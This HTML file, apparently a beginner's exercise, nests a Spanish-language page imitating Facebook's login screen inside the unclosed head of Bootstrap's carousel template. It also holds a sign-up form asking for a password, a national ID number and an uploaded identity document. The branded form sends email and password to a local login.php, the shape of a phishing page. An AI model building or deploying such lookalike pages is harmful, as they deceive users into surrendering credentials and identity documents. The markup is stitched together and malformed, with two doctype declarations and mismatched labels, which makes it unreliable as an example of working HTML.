<!doctype html>
<html lang="en" data-bs-theme="auto">
  <head><script src="../assets/js/color-modes.js"></script>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Hugo 0.122.0">
    <title>Carousel Template · Bootstrap v5.3</title>

    <link rel="canonical" href="https://getbootstrap.com/docs/5.3/examples/carousel/">

    <!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 100%;
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo img {
            width: 150px;
        }

        h1 {
            text-align: center;
            color: #1877f2;
            font-size: 24px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            font-size: 14px;
            color: #606770;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            margin-top: 5px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
        }

        .btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #165bb3;
        }

        .link {
            text-align: center;
            margin-top: 20px;
        }

        .link a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .link a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
        <h1>Iniciar sesión en Facebook</h1>
        <form action="login.php" method="post">
            <div class="form-group">
                <label for="email">Correo electrónico o teléfono</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Iniciar sesión</button>
        </form>
        <div class="link">
        <a href="olvidaste.php">¿Olvidaste tu contraseña?</a>
        </div>
        <div class="link">
            <a href="crear.php">Crear cuenta nueva</a>
        </div>
        <div class="link">
        <a href="volver.php">iniciar de nuevo</a>
        </div>
    </div>
</body>
</html>

<br>
<h2>Crear cuenta nueva</h2>
   <label for="text">Nombres:</label>
   <input type="text" id="text" name="text" placeholder="digite su nombre"><br><br>

   <label for="text">Apellidos:</label>
   <input type="text" id="text" name="text" placeholder="digite su apelido"><br><br>

   <label>Sexo:</label>
   <input type="radio" id="radio1" name="radio" value="1">
   <label for="radio1">Femenino</label>
   <input type="radio" id="radio2" name="radio" value="2">
   <label for="radio2">Masculino</label><br><br>

   <label for="email">Correo:</label>
   <input type="email" id="email" name="email"><br><br>

   <label for="password">Contraseña:</label>
   <input type="password" id="password" name="password"><br><br>

   <label for="number">Número de T.I-C.C:</label>
   <input type="number" id="number" name="number"><br><br>

   <p>Documento de identidad</p>
   <label for="file"></label>
   <input type="file" id="file" name="file"><br><br>

   <label for="tel">Teléfono:</label>
   <input type="tel" id="tel" name="tel"><br><br>

   <label for="date">Fecha:</label>
   <input type="date" id="date" name="date"><br><br>

   <label for="time">Hora:</label>
   <input type="time" id="time" name="time"><br><br>

   <p> ¿Cómo calificarías tu nivel de satisfacción con nuestro servicio?</p>
   <p>Eligue un numero del 1-10</p>
   <label for="range"><label>
   <input type="range" id="range" name="range" min="1" max="10"><br><br>

   <input type="submit" value="Enviar">
   <input type="reset" value="reintentarlo">



   